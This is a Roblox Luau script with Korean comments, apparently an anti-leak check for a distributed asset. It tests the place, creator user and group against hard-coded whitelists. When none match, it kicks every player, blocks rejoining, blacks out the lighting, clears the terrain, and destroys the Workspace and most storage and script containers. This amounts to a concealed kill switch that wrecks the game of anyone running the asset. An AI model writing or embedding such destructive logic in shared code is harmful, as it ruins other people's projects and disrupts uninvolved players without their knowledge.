-- [[ sys1-0 : 삼중 검증 및 확장 제어 엔진 ]]
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

-- 1. 삼중 마스터 화이트리스트 데이터베이스
local ALLOWED_PLACES = {
	[123456789] = true, -- 허가된 Place ID
}

local ALLOWED_USERS = {
	[11223344] = true,  -- 허가된 User ID
}

local ALLOWED_GROUPS = {
	[99887766] = true,  -- 허가된 Group ID
}

-- 2. 현재 환경 정보 수집
local currentPlaceId = game.PlaceId
local currentCreatorId = game.CreatorId
local currentCreatorType = game.CreatorType

--------------------------------------------------
pcall(function()
	game.ReplicatedStorage.data.Value = true
end)
--------------------------------------------------


-- 3. 교차 검증 검사
local isAuthorized = false

if ALLOWED_PLACES[currentPlaceId] then
	isAuthorized = true
	--------------------------------------------------
	pcall(function() game.ReplicatedStorage.pi.Value = true end)
	--------------------------------------------------
end

if currentCreatorType == Enum.CreatorType.User and ALLOWED_USERS[currentCreatorId] then
	isAuthorized = true
	--------------------------------------------------
	pcall(function() game.ReplicatedStorage.ui.Value = true end)
	--------------------------------------------------
end

if currentCreatorType == Enum.CreatorType.Group and ALLOWED_GROUPS[currentCreatorId] then
	isAuthorized = true
	--------------------------------------------------
	pcall(function() game.ReplicatedStorage.gi.Value = true end)
	--------------------------------------------------
end


-- 4. 조건별 실행 분기
if isAuthorized then
	-- ==========================================
	-- [인증 완료] 정상 작동 구간
	-- ==========================================

	--------------------------------------------------
	pcall(function() game.ReplicatedStorage.good.Value = true end)
	--------------------------------------------------

	--------------------------------------------------
	-- 님의 핵심 작동 코드를 여기에 배치
	--------------------------------------------------

else
	-- ==========================================
	-- [인증 실패] 비인가 환경 제어 구간
	-- ==========================================

	--------------------------------------------------
	-- 밸류 변경 시 메인 스크립트가 감지하고 주체를 지울 수 있으므로 pcall 처리
	pcall(function()
		game.ReplicatedStorage.ihateu.Value = true
	end)
	--------------------------------------------------

	-- [해결책] 복잡한 루프를 돌다 스크립트가 끊기지 않도록, 가장 확실하고 치명적인 물리 파괴만 직렬 실행
	
	-- 1. 유저 전원 즉시 강퇴 및 재접속 원천 차단
	local kickMessage = "계약 위반 및 에셋 유출로 인해 이 서버는 무력화되었습니다. (ㅅㄱ)"
	
	pcall(function()
		for _, player in pairs(Players:GetPlayers()) do
			player:Kick(kickMessage)
		end
	end)
	
	Players.PlayerAdded:Connect(function(player)
		pcall(function() player:Kick(kickMessage) end)
	end)

	-- 2. 시각 테러 (조명 암전)
	pcall(function()
		game.Lighting.Brightness = 0
		game.Lighting.ClockTime = 0
		game.Lighting.GlobalShadows = true
		game.Lighting:ClearAllChildren()
		game.Lighting.FogEnd = 0
		game.Lighting.Ambient = Color3.new(0, 0, 0)
	end)

	-- 3. 지형 즉시 삭제
	pcall(function()
		game.Workspace.Terrain:Clear()
	end)

	-- 4. 맵상의 모든 물리 오브젝트(Workspace) 무조건 파괴
	pcall(function()
		for _, item in pairs(game.Workspace:GetChildren()) do
			if not item:IsA("Player") and not item:IsA("Camera") and not item:IsA("Terrain") then
				item:Destroy()
			end
		end
	end)
	
	-- 5. 다른 스토리지 영역 파괴 (스크립트 자체의 소멸을 방지하기 위해 안전하게 pcall 분리)
	local storageContainers = {
		game.StarterGui,
		game.StarterPack,
		game.Teams,
		game.ReplicatedStorage,
		game.ServerStorage,
		game.ServerScriptService
	}

	for _, container in ipairs(storageContainers) do
		pcall(function()
			for _, item in ipairs(container:GetChildren()) do
				if item ~= script then
					item:Destroy()
				end
			end
		end)
	end
end

-- ==========================================
-- 스튜디오 메인 스크립트와 데이터 흐름 맞추기용 리턴
-- ==========================================
local SystemResult = {
	["Status"] = isAuthorized,
	["Wipe"] = function() end
}

return SystemResult
